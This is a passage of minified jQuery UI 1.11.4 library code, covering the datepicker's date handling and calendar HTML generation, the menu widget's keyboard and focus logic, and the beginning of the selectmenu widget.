$.datepicker.parseDate($.datepicker._get(inst,"dateFormat"),offset,$.datepicker._getFormatConfig(inst))}catch(e){}for(var date=(offset.toLowerCase().match(/^c/)?$.datepicker._getDate(inst):null)||new Date,year=date.getFullYear(),month=date.getMonth(),day=date.getDate(),pattern=/([+\-]?[0-9]+)\s*(d|D|w|W|m|M|y|Y)?/g,matches=pattern.exec(offset);matches;){switch(matches[2]||"d"){case"d":case"D":day+=parseInt(matches[1],10);break;case"w":case"W":day+=7*parseInt(matches[1],10);break;case"m":case"M":month+=parseInt(matches[1],10),day=Math.min(day,$.datepicker._getDaysInMonth(year,month));break;case"y":case"Y":year+=parseInt(matches[1],10),day=Math.min(day,$.datepicker._getDaysInMonth(year,month))}matches=pattern.exec(offset)}return new Date(year,month,day)}(date):"number"==typeof date?isNaN(date)?defaultDate:function(offset){var date=new Date;return date.setDate(date.getDate()+offset),date}(date):new Date(date.getTime());return(newDate=newDate&&"Invalid Date"===newDate.toString()?defaultDate:newDate)&&(newDate.setHours(0),newDate.setMinutes(0),newDate.setSeconds(0),newDate.setMilliseconds(0)),this._daylightSavingAdjust(newDate)},_daylightSavingAdjust:function(date){return date?(date.setHours(date.getHours()>12?date.getHours()+2:0),date):null},_setDate:function(inst,date,noChange){var clear=!date,origMonth=inst.selectedMonth,origYear=inst.selectedYear,newDate=this._restrictMinMax(inst,this._determineDate(inst,date,new Date));inst.selectedDay=inst.currentDay=newDate.getDate(),inst.drawMonth=inst.selectedMonth=inst.currentMonth=newDate.getMonth(),inst.drawYear=inst.selectedYear=inst.currentYear=newDate.getFullYear(),origMonth===inst.selectedMonth&&origYear===inst.selectedYear||noChange||this._notifyChange(inst),this._adjustInstDate(inst),inst.input&&inst.input.val(clear?"":this._formatDate(inst))},_getDate:function(inst){return!inst.currentYear||inst.input&&""===inst.input.val()?null:this._daylightSavingAdjust(new Date(inst.currentYear,inst.currentMonth,inst.currentDay))},_attachHandlers:function(inst){var stepMonths=this._get(inst,"stepMonths"),id="#"+inst.id.replace(/\\\\/g,"\\");inst.dpDiv.find("[data-handler]").map((function(){var handler={prev:function(){$.datepicker._adjustDate(id,-stepMonths,"M")},next:function(){$.datepicker._adjustDate(id,+stepMonths,"M")},hide:function(){$.datepicker._hideDatepicker()},today:function(){$.datepicker._gotoToday(id)},selectDay:function(){return $.datepicker._selectDay(id,+this.getAttribute("data-month"),+this.getAttribute("data-year"),this),!1},selectMonth:function(){return $.datepicker._selectMonthYear(id,this,"M"),!1},selectYear:function(){return $.datepicker._selectMonthYear(id,this,"Y"),!1}};$(this).bind(this.getAttribute("data-event"),handler[this.getAttribute("data-handler")])}))},_generateHTML:function(inst){var maxDraw,prevText,prev,nextText,next,currentText,gotoDate,controls,buttonPanel,firstDay,showWeek,dayNames,dayNamesMin,monthNames,monthNamesShort,beforeShowDay,showOtherMonths,selectOtherMonths,defaultDate,html,dow,row,group,col,selectedDate,cornerClass,calender,thead,day,daysInMonth,leadDays,curRows,numRows,printDate,dRow,tbody,daySettings,otherMonth,unselectable,tempDate=new Date,today=this._daylightSavingAdjust(new Date(tempDate.getFullYear(),tempDate.getMonth(),tempDate.getDate())),isRTL=this._get(inst,"isRTL"),showButtonPanel=this._get(inst,"showButtonPanel"),hideIfNoPrevNext=this._get(inst,"hideIfNoPrevNext"),navigationAsDateFormat=this._get(inst,"navigationAsDateFormat"),numMonths=this._getNumberOfMonths(inst),showCurrentAtPos=this._get(inst,"showCurrentAtPos"),stepMonths=this._get(inst,"stepMonths"),isMultiMonth=1!==numMonths[0]||1!==numMonths[1],currentDate=this._daylightSavingAdjust(inst.currentDay?new Date(inst.currentYear,inst.currentMonth,inst.currentDay):new Date(9999,9,9)),minDate=this._getMinMaxDate(inst,"min"),maxDate=this._getMinMaxDate(inst,"max"),drawMonth=inst.drawMonth-showCurrentAtPos,drawYear=inst.drawYear;if(drawMonth<0&&(drawMonth+=12,drawYear--),maxDate)for(maxDraw=this._daylightSavingAdjust(new Date(maxDate.getFullYear(),maxDate.getMonth()-numMonths[0]*numMonths[1]+1,maxDate.getDate())),maxDraw=minDate&&maxDraw<minDate?minDate:maxDraw;this._daylightSavingAdjust(new Date(drawYear,drawMonth,1))>maxDraw;)--drawMonth<0&&(drawMonth=11,drawYear--);for(inst.drawMonth=drawMonth,inst.drawYear=drawYear,prevText=this._get(inst,"prevText"),prevText=navigationAsDateFormat?this.formatDate(prevText,this._daylightSavingAdjust(new Date(drawYear,drawMonth-stepMonths,1)),this._getFormatConfig(inst)):prevText,prev=this._canAdjustMonth(inst,-1,drawYear,drawMonth)?"<a class='ui-datepicker-prev ui-corner-all' data-handler='prev' data-event='click' title='"+prevText+"'><span class='ui-icon ui-icon-circle-triangle-"+(isRTL?"e":"w")+"'>"+prevText+"</span></a>":hideIfNoPrevNext?"":"<a class='ui-datepicker-prev ui-corner-all ui-state-disabled' title='"+prevText+"'><span class='ui-icon ui-icon-circle-triangle-"+(isRTL?"e":"w")+"'>"+prevText+"</span></a>",nextText=this._get(inst,"nextText"),nextText=navigationAsDateFormat?this.formatDate(nextText,this._daylightSavingAdjust(new Date(drawYear,drawMonth+stepMonths,1)),this._getFormatConfig(inst)):nextText,next=this._canAdjustMonth(inst,1,drawYear,drawMonth)?"<a class='ui-datepicker-next ui-corner-all' data-handler='next' data-event='click' title='"+nextText+"'><span class='ui-icon ui-icon-circle-triangle-"+(isRTL?"w":"e")+"'>"+nextText+"</span></a>":hideIfNoPrevNext?"":"<a class='ui-datepicker-next ui-corner-all ui-state-disabled' title='"+nextText+"'><span class='ui-icon ui-icon-circle-triangle-"+(isRTL?"w":"e")+"'>"+nextText+"</span></a>",currentText=this._get(inst,"currentText"),gotoDate=this._get(inst,"gotoCurrent")&&inst.currentDay?currentDate:today,currentText=navigationAsDateFormat?this.formatDate(currentText,gotoDate,this._getFormatConfig(inst)):currentText,controls=inst.inline?"":"<button type='button' class='ui-datepicker-close ui-state-default ui-priority-primary ui-corner-all' data-handler='hide' data-event='click'>"+this._get(inst,"closeText")+"</button>",buttonPanel=showButtonPanel?"<div class='ui-datepicker-buttonpane ui-widget-content'>"+(isRTL?controls:"")+(this._isInRange(inst,gotoDate)?"<button type='button' class='ui-datepicker-current ui-state-default ui-priority-secondary ui-corner-all' data-handler='today' data-event='click'>"+currentText+"</button>":"")+(isRTL?"":controls)+"</div>":"",firstDay=parseInt(this._get(inst,"firstDay"),10),firstDay=isNaN(firstDay)?0:firstDay,showWeek=this._get(inst,"showWeek"),dayNames=this._get(inst,"dayNames"),dayNamesMin=this._get(inst,"dayNamesMin"),monthNames=this._get(inst,"monthNames"),monthNamesShort=this._get(inst,"monthNamesShort"),beforeShowDay=this._get(inst,"beforeShowDay"),showOtherMonths=this._get(inst,"showOtherMonths"),selectOtherMonths=this._get(inst,"selectOtherMonths"),defaultDate=this._getDefaultDate(inst),html="",row=0;row<numMonths[0];row++){for(group="",this.maxRows=4,col=0;col<numMonths[1];col++){if(selectedDate=this._daylightSavingAdjust(new Date(drawYear,drawMonth,inst.selectedDay)),cornerClass=" ui-corner-all",calender="",isMultiMonth){if(calender+="<div class='ui-datepicker-group",numMonths[1]>1)switch(col){case 0:calender+=" ui-datepicker-group-first",cornerClass=" ui-corner-"+(isRTL?"right":"left");break;case numMonths[1]-1:calender+=" ui-datepicker-group-last",cornerClass=" ui-corner-"+(isRTL?"left":"right");break;default:calender+=" ui-datepicker-group-middle",cornerClass=""}calender+="'>"}for(calender+="<div class='ui-datepicker-header ui-widget-header ui-helper-clearfix"+cornerClass+"'>"+(/all|left/.test(cornerClass)&&0===row?isRTL?next:prev:"")+(/all|right/.test(cornerClass)&&0===row?isRTL?prev:next:"")+this._generateMonthYearHeader(inst,drawMonth,drawYear,minDate,maxDate,row>0||col>0,monthNames,monthNamesShort)+"</div><table class='ui-datepicker-calendar'><thead><tr>",thead=showWeek?"<th class='ui-datepicker-week-col'>"+this._get(inst,"weekHeader")+"</th>":"",dow=0;dow<7;dow++)thead+="<th scope='col'"+((dow+firstDay+6)%7>=5?" class='ui-datepicker-week-end'":"")+"><span title='"+dayNames[day=(dow+firstDay)%7]+"'>"+dayNamesMin[day]+"</span></th>";for(calender+=thead+"</tr></thead><tbody>",daysInMonth=this._getDaysInMonth(drawYear,drawMonth),drawYear===inst.selectedYear&&drawMonth===inst.selectedMonth&&(inst.selectedDay=Math.min(inst.selectedDay,daysInMonth)),leadDays=(this._getFirstDayOfMonth(drawYear,drawMonth)-firstDay+7)%7,curRows=Math.ceil((leadDays+daysInMonth)/7),numRows=isMultiMonth&&this.maxRows>curRows?this.maxRows:curRows,this.maxRows=numRows,printDate=this._daylightSavingAdjust(new Date(drawYear,drawMonth,1-leadDays)),dRow=0;dRow<numRows;dRow++){for(calender+="<tr>",tbody=showWeek?"<td class='ui-datepicker-week-col'>"+this._get(inst,"calculateWeek")(printDate)+"</td>":"",dow=0;dow<7;dow++)daySettings=beforeShowDay?beforeShowDay.apply(inst.input?inst.input[0]:null,[printDate]):[!0,""],unselectable=(otherMonth=printDate.getMonth()!==drawMonth)&&!selectOtherMonths||!daySettings[0]||minDate&&printDate<minDate||maxDate&&printDate>maxDate,tbody+="<td class='"+((dow+firstDay+6)%7>=5?" ui-datepicker-week-end":"")+(otherMonth?" ui-datepicker-other-month":"")+(printDate.getTime()===selectedDate.getTime()&&drawMonth===inst.selectedMonth&&inst._keyEvent||defaultDate.getTime()===printDate.getTime()&&defaultDate.getTime()===selectedDate.getTime()?" "+this._dayOverClass:"")+(unselectable?" "+this._unselectableClass+" ui-state-disabled":"")+(otherMonth&&!showOtherMonths?"":" "+daySettings[1]+(printDate.getTime()===currentDate.getTime()?" "+this._currentClass:"")+(printDate.getTime()===today.getTime()?" ui-datepicker-today":""))+"'"+(otherMonth&&!showOtherMonths||!daySettings[2]?"":" title='"+daySettings[2].replace(/'/g,"&#39;")+"'")+(unselectable?"":" data-handler='selectDay' data-event='click' data-month='"+printDate.getMonth()+"' data-year='"+printDate.getFullYear()+"'")+">"+(otherMonth&&!showOtherMonths?"&#xa0;":unselectable?"<span class='ui-state-default'>"+printDate.getDate()+"</span>":"<a class='ui-state-default"+(printDate.getTime()===today.getTime()?" ui-state-highlight":"")+(printDate.getTime()===currentDate.getTime()?" ui-state-active":"")+(otherMonth?" ui-priority-secondary":"")+"' href='#'>"+printDate.getDate()+"</a>")+"</td>",printDate.setDate(printDate.getDate()+1),printDate=this._daylightSavingAdjust(printDate);calender+=tbody+"</tr>"}++drawMonth>11&&(drawMonth=0,drawYear++),group+=calender+="</tbody></table>"+(isMultiMonth?"</div>"+(numMonths[0]>0&&col===numMonths[1]-1?"<div class='ui-datepicker-row-break'></div>":""):"")}html+=group}return html+=buttonPanel,inst._keyEvent=!1,html},_generateMonthYearHeader:function(inst,drawMonth,drawYear,minDate,maxDate,secondary,monthNames,monthNamesShort){var inMinYear,inMaxYear,month,years,thisYear,determineYear,year,endYear,changeMonth=this._get(inst,"changeMonth"),changeYear=this._get(inst,"changeYear"),showMonthAfterYear=this._get(inst,"showMonthAfterYear"),html="<div class='ui-datepicker-title'>",monthHtml="";if(secondary||!changeMonth)monthHtml+="<span class='ui-datepicker-month'>"+monthNames[drawMonth]+"</span>";else{for(inMinYear=minDate&&minDate.getFullYear()===drawYear,inMaxYear=maxDate&&maxDate.getFullYear()===drawYear,monthHtml+="<select class='ui-datepicker-month' data-handler='selectMonth' data-event='change'>",month=0;month<12;month++)(!inMinYear||month>=minDate.getMonth())&&(!inMaxYear||month<=maxDate.getMonth())&&(monthHtml+="<option value='"+month+"'"+(month===drawMonth?" selected='selected'":"")+">"+monthNamesShort[month]+"</option>");monthHtml+="</select>"}if(showMonthAfterYear||(html+=monthHtml+(!secondary&&changeMonth&&changeYear?"":"&#xa0;")),!inst.yearshtml)if(inst.yearshtml="",secondary||!changeYear)html+="<span class='ui-datepicker-year'>"+drawYear+"</span>";else{for(years=this._get(inst,"yearRange").split(":"),thisYear=(new Date).getFullYear(),determineYear=function(value){var year=value.match(/c[+\-].*/)?drawYear+parseInt(value.substring(1),10):value.match(/[+\-].*/)?thisYear+parseInt(value,10):parseInt(value,10);return isNaN(year)?thisYear:year},year=determineYear(years[0]),endYear=Math.max(year,determineYear(years[1]||"")),year=minDate?Math.max(year,minDate.getFullYear()):year,endYear=maxDate?Math.min(endYear,maxDate.getFullYear()):endYear,inst.yearshtml+="<select class='ui-datepicker-year' data-handler='selectYear' data-event='change'>";year<=endYear;year++)inst.yearshtml+="<option value='"+year+"'"+(year===drawYear?" selected='selected'":"")+">"+year+"</option>";inst.yearshtml+="</select>",html+=inst.yearshtml,inst.yearshtml=null}return html+=this._get(inst,"yearSuffix"),showMonthAfterYear&&(html+=(!secondary&&changeMonth&&changeYear?"":"&#xa0;")+monthHtml),html+="</div>"},_adjustInstDate:function(inst,offset,period){var year=inst.drawYear+("Y"===period?offset:0),month=inst.drawMonth+("M"===period?offset:0),day=Math.min(inst.selectedDay,this._getDaysInMonth(year,month))+("D"===period?offset:0),date=this._restrictMinMax(inst,this._daylightSavingAdjust(new Date(year,month,day)));inst.selectedDay=date.getDate(),inst.drawMonth=inst.selectedMonth=date.getMonth(),inst.drawYear=inst.selectedYear=date.getFullYear(),"M"!==period&&"Y"!==period||this._notifyChange(inst)},_restrictMinMax:function(inst,date){var minDate=this._getMinMaxDate(inst,"min"),maxDate=this._getMinMaxDate(inst,"max"),newDate=minDate&&date<minDate?minDate:date;return maxDate&&newDate>maxDate?maxDate:newDate},_notifyChange:function(inst){var onChange=this._get(inst,"onChangeMonthYear");onChange&&onChange.apply(inst.input?inst.input[0]:null,[inst.selectedYear,inst.selectedMonth+1,inst])},_getNumberOfMonths:function(inst){var numMonths=this._get(inst,"numberOfMonths");return null==numMonths?[1,1]:"number"==typeof numMonths?[1,numMonths]:numMonths},_getMinMaxDate:function(inst,minMax){return this._determineDate(inst,this._get(inst,minMax+"Date"),null)},_getDaysInMonth:function(year,month){return 32-this._daylightSavingAdjust(new Date(year,month,32)).getDate()},_getFirstDayOfMonth:function(year,month){return new Date(year,month,1).getDay()},_canAdjustMonth:function(inst,offset,curYear,curMonth){var numMonths=this._getNumberOfMonths(inst),date=this._daylightSavingAdjust(new Date(curYear,curMonth+(offset<0?offset:numMonths[0]*numMonths[1]),1));return offset<0&&date.setDate(this._getDaysInMonth(date.getFullYear(),date.getMonth())),this._isInRange(inst,date)},_isInRange:function(inst,date){var yearSplit,currentYear,minDate=this._getMinMaxDate(inst,"min"),maxDate=this._getMinMaxDate(inst,"max"),minYear=null,maxYear=null,years=this._get(inst,"yearRange");return years&&(yearSplit=years.split(":"),currentYear=(new Date).getFullYear(),minYear=parseInt(yearSplit[0],10),maxYear=parseInt(yearSplit[1],10),yearSplit[0].match(/[+\-].*/)&&(minYear+=currentYear),yearSplit[1].match(/[+\-].*/)&&(maxYear+=currentYear)),(!minDate||date.getTime()>=minDate.getTime())&&(!maxDate||date.getTime()<=maxDate.getTime())&&(!minYear||date.getFullYear()>=minYear)&&(!maxYear||date.getFullYear()<=maxYear)},_getFormatConfig:function(inst){var shortYearCutoff=this._get(inst,"shortYearCutoff");return{shortYearCutoff:shortYearCutoff="string"!=typeof shortYearCutoff?shortYearCutoff:(new Date).getFullYear()%100+parseInt(shortYearCutoff,10),dayNamesShort:this._get(inst,"dayNamesShort"),dayNames:this._get(inst,"dayNames"),monthNamesShort:this._get(inst,"monthNamesShort"),monthNames:this._get(inst,"monthNames")}},_formatDate:function(inst,day,month,year){day||(inst.currentDay=inst.selectedDay,inst.currentMonth=inst.selectedMonth,inst.currentYear=inst.selectedYear);var date=day?"object"==typeof day?day:this._daylightSavingAdjust(new Date(year,month,day)):this._daylightSavingAdjust(new Date(inst.currentYear,inst.currentMonth,inst.currentDay));return this.formatDate(this._get(inst,"dateFormat"),date,this._getFormatConfig(inst))}}),$.fn.datepicker=function(options){if(!this.length)return this;$.datepicker.initialized||($(document).mousedown($.datepicker._checkExternalClick),$.datepicker.initialized=!0),0===$("#"+$.datepicker._mainDivId).length&&$("body").append($.datepicker.dpDiv);var otherArgs=Array.prototype.slice.call(arguments,1);return"string"!=typeof options||"isDisabled"!==options&&"getDate"!==options&&"widget"!==options?"option"===options&&2===arguments.length&&"string"==typeof arguments[1]?$.datepicker["_"+options+"Datepicker"].apply($.datepicker,[this[0]].concat(otherArgs)):this.each((function(){"string"==typeof options?$.datepicker["_"+options+"Datepicker"].apply($.datepicker,[this].concat(otherArgs)):$.datepicker._attachDatepicker(this,options)})):$.datepicker["_"+options+"Datepicker"].apply($.datepicker,[this[0]].concat(otherArgs))},$.datepicker=new Datepicker,$.datepicker.initialized=!1,$.datepicker.uuid=(new Date).getTime(),$.datepicker.version="1.11.4";$.datepicker,$.widget("ui.menu",{version:"1.11.4",defaultElement:"<ul>",delay:300,options:{icons:{submenu:"ui-icon-carat-1-e"},items:"> *",menus:"ul",position:{my:"left-1 top",at:"right top"},role:"menu",blur:null,focus:null,select:null},_create:function(){this.activeMenu=this.element,this.mouseHandled=!1,this.element.uniqueId().addClass("ui-menu ui-widget ui-widget-content").toggleClass("ui-menu-icons",!!this.element.find(".ui-icon").length).attr({role:this.options.role,tabIndex:0}),this.options.disabled&&this.element.addClass("ui-state-disabled").attr("aria-disabled","true"),this._on({"mousedown .ui-menu-item":function(event){event.preventDefault()},"click .ui-menu-item":function(event){var target=$(event.target);!this.mouseHandled&&target.not(".ui-state-disabled").length&&(this.select(event),event.isPropagationStopped()||(this.mouseHandled=!0),target.has(".ui-menu").length?this.expand(event):!this.element.is(":focus")&&$(this.document[0].activeElement).closest(".ui-menu").length&&(this.element.trigger("focus",[!0]),this.active&&1===this.active.parents(".ui-menu").length&&clearTimeout(this.timer)))},"mouseenter .ui-menu-item":function(event){if(!this.previousFilter){var target=$(event.currentTarget);target.siblings(".ui-state-active").removeClass("ui-state-active"),this.focus(event,target)}},mouseleave:"collapseAll","mouseleave .ui-menu":"collapseAll",focus:function(event,keepActiveItem){var item=this.active||this.element.find(this.options.items).eq(0);keepActiveItem||this.focus(event,item)},blur:function(event){this._delay((function(){$.contains(this.element[0],this.document[0].activeElement)||this.collapseAll(event)}))},keydown:"_keydown"}),this.refresh(),this._on(this.document,{click:function(event){this._closeOnDocumentClick(event)&&this.collapseAll(event),this.mouseHandled=!1}})},_destroy:function(){this.element.removeAttr("aria-activedescendant").find(".ui-menu").addBack().removeClass("ui-menu ui-widget ui-widget-content ui-menu-icons ui-front").removeAttr("role").removeAttr("tabIndex").removeAttr("aria-labelledby").removeAttr("aria-expanded").removeAttr("aria-hidden").removeAttr("aria-disabled").removeUniqueId().show(),this.element.find(".ui-menu-item").removeClass("ui-menu-item").removeAttr("role").removeAttr("aria-disabled").removeUniqueId().removeClass("ui-state-hover").removeAttr("tabIndex").removeAttr("role").removeAttr("aria-haspopup").children().each((function(){var elem=$(this);elem.data("ui-menu-submenu-carat")&&elem.remove()})),this.element.find(".ui-menu-divider").removeClass("ui-menu-divider ui-widget-content")},_keydown:function(event){var match,prev,character,skip,preventDefault=!0;switch(event.keyCode){case $.ui.keyCode.PAGE_UP:this.previousPage(event);break;case $.ui.keyCode.PAGE_DOWN:this.nextPage(event);break;case $.ui.keyCode.HOME:this._move("first","first",event);break;case $.ui.keyCode.END:this._move("last","last",event);break;case $.ui.keyCode.UP:this.previous(event);break;case $.ui.keyCode.DOWN:this.next(event);break;case $.ui.keyCode.LEFT:this.collapse(event);break;case $.ui.keyCode.RIGHT:this.active&&!this.active.is(".ui-state-disabled")&&this.expand(event);break;case $.ui.keyCode.ENTER:case $.ui.keyCode.SPACE:this._activate(event);break;case $.ui.keyCode.ESCAPE:this.collapse(event);break;default:preventDefault=!1,prev=this.previousFilter||"",character=String.fromCharCode(event.keyCode),skip=!1,clearTimeout(this.filterTimer),character===prev?skip=!0:character=prev+character,match=this._filterMenuItems(character),(match=skip&&-1!==match.index(this.active.next())?this.active.nextAll(".ui-menu-item"):match).length||(character=String.fromCharCode(event.keyCode),match=this._filterMenuItems(character)),match.length?(this.focus(event,match),this.previousFilter=character,this.filterTimer=this._delay((function(){delete this.previousFilter}),1e3)):delete this.previousFilter}preventDefault&&event.preventDefault()},_activate:function(event){this.active.is(".ui-state-disabled")||(this.active.is("[aria-haspopup='true']")?this.expand(event):this.select(event))},refresh:function(){var items,that=this,icon=this.options.icons.submenu,submenus=this.element.find(this.options.menus);this.element.toggleClass("ui-menu-icons",!!this.element.find(".ui-icon").length),submenus.filter(":not(.ui-menu)").addClass("ui-menu ui-widget ui-widget-content ui-front").hide().attr({role:this.options.role,"aria-hidden":"true","aria-expanded":"false"}).each((function(){var menu=$(this),item=menu.parent(),submenuCarat=$("<span>").addClass("ui-menu-icon ui-icon "+icon).data("ui-menu-submenu-carat",!0);item.attr("aria-haspopup","true").prepend(submenuCarat),menu.attr("aria-labelledby",item.attr("id"))})),(items=submenus.add(this.element).find(this.options.items)).not(".ui-menu-item").each((function(){var item=$(this);that._isDivider(item)&&item.addClass("ui-widget-content ui-menu-divider")})),items.not(".ui-menu-item, .ui-menu-divider").addClass("ui-menu-item").uniqueId().attr({tabIndex:-1,role:this._itemRole()}),items.filter(".ui-state-disabled").attr("aria-disabled","true"),this.active&&!$.contains(this.element[0],this.active[0])&&this.blur()},_itemRole:function(){return{menu:"menuitem",listbox:"option"}[this.options.role]},_setOption:function(key,value){"icons"===key&&this.element.find(".ui-menu-icon").removeClass(this.options.icons.submenu).addClass(value.submenu),"disabled"===key&&this.element.toggleClass("ui-state-disabled",!!value).attr("aria-disabled",value),this._super(key,value)},focus:function(event,item){var nested,focused;this.blur(event,event&&"focus"===event.type),this._scrollIntoView(item),this.active=item.first(),focused=this.active.addClass("ui-state-focus").removeClass("ui-state-active"),this.options.role&&this.element.attr("aria-activedescendant",focused.attr("id")),this.active.parent().closest(".ui-menu-item").addClass("ui-state-active"),event&&"keydown"===event.type?this._close():this.timer=this._delay((function(){this._close()}),this.delay),(nested=item.children(".ui-menu")).length&&event&&/^mouse/.test(event.type)&&this._startOpening(nested),this.activeMenu=item.parent(),this._trigger("focus",event,{item:item})},_scrollIntoView:function(item){var borderTop,paddingTop,offset,scroll,elementHeight,itemHeight;this._hasScroll()&&(borderTop=parseFloat($.css(this.activeMenu[0],"borderTopWidth"))||0,paddingTop=parseFloat($.css(this.activeMenu[0],"paddingTop"))||0,offset=item.offset().top-this.activeMenu.offset().top-borderTop-paddingTop,scroll=this.activeMenu.scrollTop(),elementHeight=this.activeMenu.height(),itemHeight=item.outerHeight(),offset<0?this.activeMenu.scrollTop(scroll+offset):offset+itemHeight>elementHeight&&this.activeMenu.scrollTop(scroll+offset-elementHeight+itemHeight))},blur:function(event,fromFocus){fromFocus||clearTimeout(this.timer),this.active&&(this.active.removeClass("ui-state-focus"),this.active=null,this._trigger("blur",event,{item:this.active}))},_startOpening:function(submenu){clearTimeout(this.timer),"true"===submenu.attr("aria-hidden")&&(this.timer=this._delay((function(){this._close(),this._open(submenu)}),this.delay))},_open:function(submenu){var position=$.extend({of:this.active},this.options.position);clearTimeout(this.timer),this.element.find(".ui-menu").not(submenu.parents(".ui-menu")).hide().attr("aria-hidden","true"),submenu.show().removeAttr("aria-hidden").attr("aria-expanded","true").position(position)},collapseAll:function(event,all){clearTimeout(this.timer),this.timer=this._delay((function(){var currentMenu=all?this.element:$(event&&event.target).closest(this.element.find(".ui-menu"));currentMenu.length||(currentMenu=this.element),this._close(currentMenu),this.blur(event),this.activeMenu=currentMenu}),this.delay)},_close:function(startMenu){startMenu||(startMenu=this.active?this.active.parent():this.element),startMenu.find(".ui-menu").hide().attr("aria-hidden","true").attr("aria-expanded","false").end().find(".ui-state-active").not(".ui-state-focus").removeClass("ui-state-active")},_closeOnDocumentClick:function(event){return!$(event.target).closest(".ui-menu").length},_isDivider:function(item){return!/[^\-\u2014\u2013\s]/.test(item.text())},collapse:function(event){var newItem=this.active&&this.active.parent().closest(".ui-menu-item",this.element);newItem&&newItem.length&&(this._close(),this.focus(event,newItem))},expand:function(event){var newItem=this.active&&this.active.children(".ui-menu ").find(this.options.items).first();newItem&&newItem.length&&(this._open(newItem.parent()),this._delay((function(){this.focus(event,newItem)})))},next:function(event){this._move("next","first",event)},previous:function(event){this._move("prev","last",event)},isFirstItem:function(){return this.active&&!this.active.prevAll(".ui-menu-item").length},isLastItem:function(){return this.active&&!this.active.nextAll(".ui-menu-item").length},_move:function(direction,filter,event){var next;this.active&&(next="first"===direction||"last"===direction?this.active["first"===direction?"prevAll":"nextAll"](".ui-menu-item").eq(-1):this.active[direction+"All"](".ui-menu-item").eq(0)),next&&next.length&&this.active||(next=this.activeMenu.find(this.options.items)[filter]()),this.focus(event,next)},nextPage:function(event){var item,base,height;this.active?this.isLastItem()||(this._hasScroll()?(base=this.active.offset().top,height=this.element.height(),this.active.nextAll(".ui-menu-item").each((function(){return(item=$(this)).offset().top-base-height<0})),this.focus(event,item)):this.focus(event,this.activeMenu.find(this.options.items)[this.active?"last":"first"]())):this.next(event)},previousPage:function(event){var item,base,height;this.active?this.isFirstItem()||(this._hasScroll()?(base=this.active.offset().top,height=this.element.height(),this.active.prevAll(".ui-menu-item").each((function(){return(item=$(this)).offset().top-base+height>0})),this.focus(event,item)):this.focus(event,this.activeMenu.find(this.options.items).first())):this.next(event)},_hasScroll:function(){return this.element.outerHeight()<this.element.prop("scrollHeight")},select:function(event){this.active=this.active||$(event.target).closest(".ui-menu-item");var ui={item:this.active};this.active.has(".ui-menu").length||this.collapseAll(event,!0),this._trigger("select",event,ui)},_filterMenuItems:function(character){var escapedCharacter=character.replace(/[\-\[\]{}()*+?.,\\\^$|#\s]/g,"\\$&"),regex=new RegExp("^"+escapedCharacter,"i");return this.activeMenu.find(this.options.items).filter(".ui-menu-item").filter((function(){return regex.test($.trim($(this).text()))}))}}),$.widget("ui.selectmenu",{version:"1.11.4",defaultElement:"<select>",options:{appendTo:null,disabled:null,icons:{button:"ui-icon-triangle-1-s"},position:{my:"left top",at:"left bottom",collision:"none"},width:null,change:null,close:null,focus:null,open:null,select:null},_create:function(){var selectmenuId=this.element.uniqueId().attr("id");this.ids={element:selectmenuId,button:selectmenuId+"-button",menu:selectmenuId+"-menu"},this._drawButton(),this._drawMenu(),this.options.disabled&&this.disable()},_drawButton:function(){var that=this;this.label=$("label[for='"+this.ids.element+"']").attr("for",this.ids.button),this._on(this.label,{click:function(event){this.button.focus(),event.preventDefault()}}),this.element.hide(),this.button=$("<span>",{class:"ui-selectmenu-button ui-widget ui-state-default ui-corner-all",tabindex:this.options.disabled?-1:0,id:this.ids.button,role:"combobox","aria-expanded":"false","aria-autocomplete":"list","aria-owns":this.ids.menu,"aria-haspopup":"true"}).insertAfter(this.element),$("<span>",{class:"ui-icon "+this.options.icons.button}).prependTo(this.button),this.buttonText=$("<span>",{class:"ui-selectmenu-text"}).appendTo(this.button),this._setText(this.buttonText,this.element.find("option:selected").text()),this._resizeButton(),this._on(this.button,this._buttonEvents),this.button.one("focusin",(function(){that.menuItems||that._refreshMenu()})),this._hoverable(this.button),this._focusable(this.button)},_drawMenu:function(){var that=this;this.menu=$("<ul>",{"aria-hidden":"true","aria-labelledby":this.ids.button,id:this.ids.menu}),this.menuWrap=$("<div>",{class:"ui-selectmenu-menu ui-front"}).append(this.menu).appendTo(this._appendTo()),this.menuInstance=this.menu.menu({role:"listbox",select:function(event,ui){event.preventDefault(),that._setSelection(),that._select(ui.item.data("ui-selectmenu-item"),event)},focus:function(event,ui){var item=ui.item.data("ui-selectmenu-item");null!=that.focusIndex&&item.index!==that.focusIndex&&(that._trigger("focus",event,{item:item}),that.isOpen||that._select(item,event)),that.focusIndex=item.index,that.button.attr("aria-activedescendant",that.menuItems.eq(item.index).attr("id"))}}).menu("instance"),this.menu.addClass("ui-corner-bottom").removeClass("ui-corner-all"),this.menuInstance._off(this.menu,"mouseleave"),this.menuInstance._closeOnDocumentClick=function(){return!1},this.menuInstance._isDivider=function(){return!1}},refresh:function(){this._refreshMenu(),this._setText(this.buttonText,this._getSelectedItem().text()),this.options.width||this._resizeButton()},_refreshMenu:function(){this.menu.empty();var item,options=this.element.find("option");options.length&&(this._parseOptions(options),this._renderMenu(this.menu,this.items),this.menuInstance.refresh(),this.menuItems=this.menu.find("li").not(".ui-selectmenu-optgroup"),item=this._getSelectedItem(),this.menuInstance.focus(null,item),this._setAria(item.data("ui-selectmenu-item")),this._setOption("disabled",this.element.prop("disabled")))},open:function(event){this.options.disabled||(this.menuItems?(this.menu.find(".ui-state-focus").removeClass("ui-state-focus"),this.menuInstance.focus(null,this._getSelectedItem())):this._refreshMenu(),this.isOpen=!0,this._toggleAttr(),this._resizeMenu(),this._position(),this._on(this.document,this._documentClick),this._trigger("open",event))},_position:function(){this.menuWrap.position($.extend({of:this.button},this.options.position))},close:function(event){this.isOpen&&(this.isOpen=!1,this._toggleAttr(),this.range=null,this._off(this.document),this._trigger("close",event))},widget:function(){return this.button},menuWidget:function(){return this.menu},_renderMenu:function(ul,items){var that=this,currentOptgroup="";$.each(items,(function(index,item){item.optgroup!==currentOptgroup&&($("<li>",{class:"ui-selectmenu-optgroup ui-menu-divider"+(item.element.parent("optgroup").prop("disabled")?" ui-state-disabled":""),text:item.optgroup}).appendTo(ul),currentOptgroup=item.optgroup),that._renderItemData(ul,item)}))},_renderItemData:function(ul,item){return this._renderItem(ul,item).data("ui-selectmenu-item",item)},_renderItem:function(ul,item){var li=$("<li>");return item.disabled&&li.addClass("ui-state-disabled"),this._setText(li,item.label),li.appendTo(ul)},_setText:function(element,value){value?element.text(value):element.html("&#160;")},_move:function(direction,event){var 